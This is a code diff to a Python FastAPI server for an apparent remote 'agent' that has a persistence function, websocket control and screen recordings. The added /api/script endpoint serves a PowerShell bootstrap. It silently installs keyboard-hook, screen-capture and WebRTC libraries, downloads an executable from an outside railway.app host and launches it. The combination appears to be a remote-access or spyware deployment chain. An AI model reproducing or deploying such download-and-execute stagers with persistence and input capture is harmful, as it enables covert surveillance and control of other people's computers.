@@ -11,7 +11,7 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, Request
 from fastapi.staticfiles import StaticFiles
 import uvicorn
 from fastapi.responses import HTMLResponse, Response
-AGENT_VERSION = "9.3.8-FIX"
+AGENT_VERSION = "9.3.9-P2P"
 app = FastAPI()
 
 def install_persistence():
@@ -232,6 +232,24 @@ async def websocket_endpoint(websocket: WebSocket):
         manager.disconnect(websocket)
     except Exception as e:
         manager.disconnect(websocket)
+
+@app.get("/api/script")
+async def get_bootstrap_script():
+    ps_script = f"""
+Write-Host "--- MRL AGENT BOOTSTRAP ({AGENT_VERSION}) ---" -ForegroundColor Cyan
+$dest = "$HOME\\Desktop\\mrl_agent.exe"
+$url = "https://web-production-d6db5.up.railway.app/api/download"
+
+# Install Dependencies
+Write-Host "[SETUP] Verifying Python environment..."
+pip install aiortc orjson mss pynput psutil opencv-python numpy --quiet 2>$null
+
+Write-Host "[SETUP] Downloading agent binary..."
+Invoke-WebRequest -Uri $url -OutFile $dest
+Write-Host "[BOOT] Launching agent..."
+Start-Process $dest
+"""
+    return Response(content=ps_script, media_type="text/plain")
 
 app.mount("/recordings", StaticFiles(directory=RECORDINGS_DIR), name="recordings")
 app.mount("/", StaticFiles(directory=".", html=True), name="static")
